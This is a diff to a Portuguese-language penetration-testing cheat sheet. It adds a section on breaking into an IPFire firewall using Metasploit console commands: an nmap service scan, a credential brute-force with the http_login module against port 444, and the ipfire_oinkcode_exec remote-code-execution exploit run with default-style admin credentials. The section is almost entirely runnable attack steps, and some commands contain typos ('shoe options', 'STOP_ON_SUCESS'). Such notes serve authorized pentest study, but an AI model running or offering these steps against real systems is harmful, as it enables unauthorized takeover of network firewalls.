@@ -214,30 +214,55 @@ Buscando vulnerabilidades
 `db_nmap --open -p 445 192.168.0.1 --script=vuln -Pn`
 
 
+## Mindset: Invadindo um firewall
 
+Buscando portas abertas
 
+msf5> `db_nmap --open -Pn -sV 192.168.0.1`
 
+Listando hosts 
 
+msf5> `hosts`
 
+*Obs:Tente identificar qual o firewall é utilizado na aplicação, caso o firewall utilizado seja opensource você pode analisar toda a estrutura atraves dos repositorios oficiais, analisando seus principais componentes.*
+- Faça testes eveja como a aplicação se comporta.
+- 
 
+IPFire
 
+msf5> `search ipfire`
 
+msf5> `auxiliary(scanner/http/http_login)`
 
+msf5> `set RHOSTS 192.168.0.1`
 
+msf5> `set RPORT 444`
 
+msf5> `set SSL true`
 
+msf5> `set STOP_ON_SUCESS yes`
 
+msf5> `set PASS_FILE /opt/pass.txt`
 
+msf5> `set USER_FILE /opt/users.txt`
 
+msf5> `shoe options`
 
+msf5>  `run`
 
+-
 
+msf5> `exploit(linux/http/ipfire_oinkcode_exec)`
 
+msf5> `set PASSWORD security`
 
+msf5> `set USERNAME admin`
 
+msf5> `set LPORT 443`
 
+msf5> `show options`
 
-
+msf5> `exploit`
 
 
 
